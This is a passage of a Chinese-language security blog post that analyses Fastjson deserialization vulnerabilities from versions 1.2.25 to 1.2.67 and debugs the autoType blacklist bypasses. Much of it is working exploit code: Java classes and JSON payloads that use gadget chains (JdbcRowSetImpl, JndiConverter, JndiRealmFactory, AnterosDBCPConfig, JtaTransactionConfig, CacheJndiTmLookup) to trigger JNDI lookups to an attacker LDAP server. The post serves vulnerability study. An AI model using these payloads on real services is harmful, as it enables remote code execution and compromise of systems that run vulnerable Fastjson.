Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408311541263.png" alt="image-20240831154143113"></p><p>分析一下这个payload的原理，首先前面我们知道只加一个[是可以进入loadClass里面的，但是此时会json解析错误</p><p><img src="https://cdn.clown2024.cn/202408311550012.png" alt="image-20240831155047869"></p><p>这里说期待一个[但是在第七十一位置是’,’，就是TemplatesImpl后面那个逗号的位置</p><p>那我们就补上一个[</p><p><img src="https://cdn.clown2024.cn/202408311554785.png" alt="image-20240831155444662"></p><p>然后又说缺少一个{，那再补上去即可</p><blockquote><p>不过怪怪的这就能解析成功了？😢</p></blockquote><h1><span id="fastjson1225-1247通杀">FastJson1.2.25-1.2.47通杀</span></h1><p><strong>影响版本</strong></p><p>1.2.25-1.2.32:</p><p>未开启AutoTypeSupport时能成功利用，开启了反而不行</p><p>1.2.33-1.2.47:</p><p>无论是否开启AutoTypeSupport都能成功利用</p><p><strong>其他的限制</strong></p><p>基于RMI利用的JDK版本&lt;&#x3D;6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;&#x3D;6u211、7u201、8u191</p><h2><span id="1225ltx3dfastjsonltx3d1232">1.2.25&lt;&#x3D;Fastjson&lt;&#x3D;1.2.32</span></h2><p>先给出exp，这里用的JdbcRowSetImpl的链子</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fastjson6</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;a\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;b\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:9999/zoZdyoJH\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;autoCommit\&quot;:true\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408311634449.png" alt="image-20240831163451309"></p><p>整体思路：通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，checkAutoType()就会抛出异常终止程序。</p><p>去看一下他的checkAutoType函数来分析一下</p><p><img src="https://cdn.clown2024.cn/202408311638035.png" alt="image-20240831163822049"></p><p>我们先从缓存中去获取这个类，然后为null直接到findClass这里，这里的缓存mapping在一开始的时候会自动执行静态代码块放一些类进去</p><p><img src="https://cdn.clown2024.cn/202408311643708.png" alt="image-20240831164311603"></p><p>然后遍历buckets，根据键值查找是否存在该类，这里是可以直接找到的，然后判断clazz不为空后直接返回</p><p>然后一路往下走到deserialize的地方</p><p><img src="https://cdn.clown2024.cn/202408311646395.png" alt="image-20240831164635293"></p><p>这里调用的是**MiscCodec.deserialze()**，走进去跟进</p><p><img src="https://cdn.clown2024.cn/202408311649743.png" alt="image-20240831164903622"></p><p>往下到这里，判断键值是否为val，是的话再提取val键对应的值赋给objVal变量，而objVal在后面会赋值给strVal变量</p><p><img src="https://cdn.clown2024.cn/202408311650152.png" alt="image-20240831165057048"></p><p>这里赋值了给strVal</p><p>然后继续往下</p><p><img src="https://cdn.clown2024.cn/202408311658049.png" alt="image-20240831165810941"></p><p>判断clazz是否为Class.class，然后到这里loadClass</p><p><img src="https://cdn.clown2024.cn/202408311659949.png" alt="image-20240831165951852"></p><p>load完之后就会放入缓存中</p><p>然后在扫描第二部分JSON数据的时候，由于我们的类已经被放在缓存中了，我们在前面的**TypeUtils.getClassFromMapping(typeName)**就能获取到clazz，然后直接返回</p><p><img src="https://cdn.clown2024.cn/202408311703708.png" alt="image-20240831170308601"></p><p>可以看到直接返回从而绕过了checkAutoType</p><p>然后如果开启了autoTypeSupport的话就会无法绕过前面的黑名单，所以开启了反而不行</p><p><img src="https://cdn.clown2024.cn/202408311704028.png" alt="image-20240831170428910"></p><h2><span id="1233ltx3dfastjsonltx3d1247">1.2.33&lt;&#x3D;Fastjson&lt;&#x3D;1.2.47</span></h2><p>这部分的版本开了autoTypeSupport是可以成功</p><p><strong>未开启autoType时</strong></p><p>这里就和前面一样就不用分析了</p><p><strong>开启autoType时</strong></p><p>这里checkAutoType改了一点地方</p><p><img src="https://cdn.clown2024.cn/202408311724426.png" alt="image-20240831172445310"></p><p>这里多了一个判断，需要**TypeUtils.getClassFromMapping(typeName)**返回为null才行，我们这里返回不为null自然也不会抛出异常</p><h1><span id="fastjson1248-1268">Fastjson1.2.48-1.2.68</span></h1><p>这部分版本很多都是用黑名单绕过的利用方式，参考文章：<a href="https://www.anquanke.com/post/id/232774">https://www.anquanke.com/post/id/232774</a></p><h2><span id="fastjsonltx3d1262">Fastjson&lt;&#x3D;1.2.62</span></h2><p>一样先给个payload</p><p>org.apache.xbean.propertyeditor.JndiConverter类的toObjectImpl()函数存在JNDI注入漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;ldap://127.0.0.1:9999/zoZdyoJH&quot;&#125;;<br></code></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-comment">//fastjson1.2.62</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Advanced_Version</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;ldap://127.0.0.1:9999/zoZdyoJH\&quot;&#125;&quot;</span>;<br>        JSON.parse(poc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>该利用方式还需要我们满足一些前置条件：</p><ul><li><p>需要开启AutoType；</p></li><li><p>Fastjson &lt;&#x3D; 1.2.62；</p></li><li><p>JNDI注入利用所受的JDK版本限制；</p></li><li><p>目标服务端需要存在xbean-reflect包；</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.xbean<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xbean-reflect<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.18<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><p><img src="https://cdn.clown2024.cn/202408312240189.png" alt="image-20240831224018027"></p><p><strong>调试分析</strong></p><p>先根据payload看一下利用的点</p><p>看一下关键类<strong>JndiConverter</strong>的jndi利用点</p><p><img src="https://cdn.clown2024.cn/202409010012684.png" alt="image-20240901001248560"></p><p>那就是需要我们的set方法能够触发到该类，然后看payload可以知道是触发了一个<strong>setAsText</strong>方法，但是这个类没有，那就应该是在父类里面，我们可以往上查找调用类，最终是找到了一个<strong>AbstractConverter</strong>的类</p><p><img src="https://cdn.clown2024.cn/202409010015651.png" alt="image-20240901001557551"></p><p><img src="https://cdn.clown2024.cn/202409010016240.png" alt="image-20240901001634139"></p><p>他这里调用了toObject方法</p><p><img src="https://cdn.clown2024.cn/202409010017706.png" alt="image-20240901001722611"></p><p>然后调用了toObjectImpl方法，最终到我们执行jndi的地方</p><p>利用链的流程知道了，现在来看一下checkAutoType函数的流程，主要是看看他新增的逻辑，这里分析的是开启autoTypeSupport的时候</p><p><img src="https://cdn.clown2024.cn/202409010028755.png" alt="image-20240901002806625"></p><p>这里会先进到第一部分的黑白名单判断，由于该类不在黑白名单内就直接往下走</p><p><img src="https://cdn.clown2024.cn/202409010032724.png" alt="image-20240901003236610"></p><p>一路走到这个类，此时clazz为null且开启了autoTypeSupport，就直接loadClass，后面就是正常的反序列化流程了</p><p><strong>未开启autoTypeSupport</strong></p><p><img src="https://cdn.clown2024.cn/202409010037003.png" alt="image-20240901003743874"></p><p>他会进到这里的判断逻辑，也是正常的黑白名单校验直接过去，主要的是他会走到下面这个地方</p><p><img src="https://cdn.clown2024.cn/202409010039269.png" alt="image-20240901003925151"></p><p>这里会直接抛异常所以也就不会loadClass了</p><h2><span id="fastjson1266">Fastjson1.2.66</span></h2><p>该版本也是黑名单绕过，1.2.66涉及多条Gadget链，原理都是存在JDNI注入漏洞。</p><p>给出各链子的payload</p><p>org.apache.shiro.realm.jndi.JndiRealmFactory类PoC：</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;jndiNames&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;Realms&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>br.com.anteros.dbcp.AnterosDBCPConfig类PoC：</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;metricRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;</span><span class="hljs-punctuation">&#125;</span><br>或<br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;healthCheckRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类PoC：</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.util.Properties&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;UserTransaction&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>满足条件：</p><ul><li>开启AutoType；</li><li>Fastjson &lt;&#x3D; 1.2.66；</li><li>JNDI注入利用所受的JDK版本限制；</li><li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；</li><li>br.com.anteros.dbcp.AnterosDBCPConfig类需要Anteros-Core和Anteros-DBCP包；</li><li>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；</li></ul><p>emmm我调试了一下1.2.62的payload，发现他的判断逻辑没有什么变化，只是把黑名单增加了应该是，所以直接在黑名单处被检测到然后抛出异常</p><p><img src="https://cdn.clown2024.cn/202409010044210.png" alt="image-20240901004414066"></p><p>所以autoType的部分就不分析了，就看各payload的利用链就好</p><p><strong>org.apache.shiro.realm.jndi.JndiRealmFactory</strong></p><p>先导入依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.8.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shiro_Version</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.realm.jndi.JndiRealmFactory\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://127.0.0.1:9999/zoZdyoJH\&quot;], \&quot;Realms\&quot;:[\&quot;\&quot;]&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409010104683.png" alt="image-20240901010441536"></p><p>我们直接去看一下<strong>JndiRealmFactory</strong>这个类，发现他的getRealms方法存在JNDI注入</p><p><img src="https://cdn.clown2024.cn/202409010113706.png" alt="image-20240901011300563"></p><p>然后是遍历jndiNames来传入参数，所以这里payload设置一个jndiNames数组</p><p>get方法调用：</p><p>至于这里为什么调用get而不是set，也补充一下前面没有提到这个</p><p>还记得前面有对各种方法和字段遍历的JavaBeanInfo的封装吧</p><p><img src="https://cdn.clown2024.cn/202409010144471.png" alt="image-20240901014448343"></p><p>这个版本虽然改了一点，但不影响目前的分析，这个箭头所指的就是在遍历类的get方法，我们看一下执行了什么操作</p><p><img src="https://cdn.clown2024.cn/202409010150192.png" alt="image-20240901015008065"></p><p>这里对返回值的类型进行了判断，如果为符合的类型进到逻辑里面，我们这里传的是[]且get方法返回值为Collection符合返回值为Collection的情况所以会继续往下</p><p><img src="https://cdn.clown2024.cn/202409010210700.png" alt="image-20240901021056578"></p><p>然后如果类里面没有set方法就会走到这里遍历get方法的这一步，不然就会进入到上一步的continue，因为前面的一个遍历method是优先set方法，最后同样是add进了fieldList</p><p>然后跟进去newFieldInfo里面，这里要注意一个重要的属性<strong>getOnly</strong></p><p><img src="https://cdn.clown2024.cn/202409010215166.png" alt="image-20240901021533021"></p><p>在这里面将getOnly赋值为了true</p><p>然后一路跟进最后会进到这个方法</p><p><img src="https://cdn.clown2024.cn/202409010221406.png" alt="image-20240901022101254"></p><p>此时getOnly已经为true，继续往下</p><p><img src="https://cdn.clown2024.cn/202409010221503.png" alt="image-20240901022129364"></p><p>最终走到这执行了get方法</p><p>所以总结执行get方法的条件(不过主要是针对用了parse方法而没用parseObject，因为parseObject本身就会连get一起执行)：</p><p>parse他会去优先去匹配调用字段的set方法，如果没有set方法，就会去寻找字段的get方法且返回值要是Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong</p><blockquote><p>所以前面可能写的有点乱，因为写到这才真正调回get和set的调用😢</p></blockquote><p><strong>br.com.anteros.dbcp.AnterosDBCPConfig</strong></p><p>导入依赖：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/br.com.anteros/Anteros-Core --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>br.com.anteros<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Anteros-Core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/br.com.anteros/Anteros-DBCP --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>br.com.anteros<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Anteros-DBCP<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Anteros_Version</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        String payload1=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;ldap://127.0.0.1:9999/xCxXLJwZ\&quot;&#125;&quot;</span>;<br>        String payload2=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;ldap://127.0.0.1:9999/xCxXLJwZ\&quot;&#125;&quot;</span>;<br>        JSON.parse(payload1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>payload1分析</strong></p><p>调用AnterosDBCPConfig#setMetricRegistry</p><p><img src="https://cdn.clown2024.cn/202409011042417.png" alt="image-20240901104216255"></p><p>然后调用AnterosDBCPConfig#getObjectOrPerformJndiLookup</p><p><img src="https://cdn.clown2024.cn/202409011043947.png" alt="image-20240901104316840"></p><p>这里存在jndi注入漏洞</p><p><strong>payload2分析</strong></p><p>调用AnterosDBCPConfig#setHealthCheckRegistry</p><p><img src="https://cdn.clown2024.cn/202409011044736.png" alt="image-20240901104447626"></p><p>调用AnterosDBCPConfig#getObjectOrPerformJndiLookup</p><p><img src="https://cdn.clown2024.cn/202409011045210.png" alt="image-20240901104535103"></p><p>这里存在jndi注入漏洞</p><blockquote><p>这个Anteros看maven仓库用的人好少，感觉比较难碰到</p></blockquote><p><strong>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig</strong></p><p>导入依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.ibatis/ibatis-sqlmap --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.ibatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ibatis-sqlmap<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.4.726<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/javax.transaction/jta --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.transaction<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jta<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JTA_Version</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;ldap://127.0.0.1:9999/xCxXLJwZ\&quot;&#125;&#125;&quot;</span>;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409011109175.png" alt="image-20240901110919034"></p><p>利用链分析</p><p>首先调用到JtaTransactionConfig#setProperties方法</p><p><img src="https://cdn.clown2024.cn/202409011111348.png" alt="image-20240901111125227"></p><p>这里存在jndi漏洞，但是utxName获取为固定的键值，为Properties对象的UserTransaction</p><p>所以payload里的properties值的设置为Properties类然后加一个UserTransaction属性</p><h2><span id="fastjson1267">Fastjson1.2.67</span></h2><p>也是黑名单绕过，直接给payload，不想分析了（</p><p>这里的条件也是开启autoType</p><p><strong>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup</strong></p><p>需要ignite-core、ignite-jta和jta依赖</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;, &quot;jndiNames&quot;:[&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;], &quot;tm&quot;: &#123;&quot;$ref&quot;:&quot;$.tm&quot;&#125;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.ignite/ignite-jta --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.ignite<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ignite-jta<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.transaction<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jta<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.ignite/ignite-core --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.ignite<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ignite-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.8.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>代码示例：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">liuqi_banben</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://127.0.0.1:9999/BXcEBBgx\&quot;], \&quot;tm\&quot;: &#123;\&quot;$ref\&quot;:\&quot;$.tm\&quot;&#125;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409031930659.png" 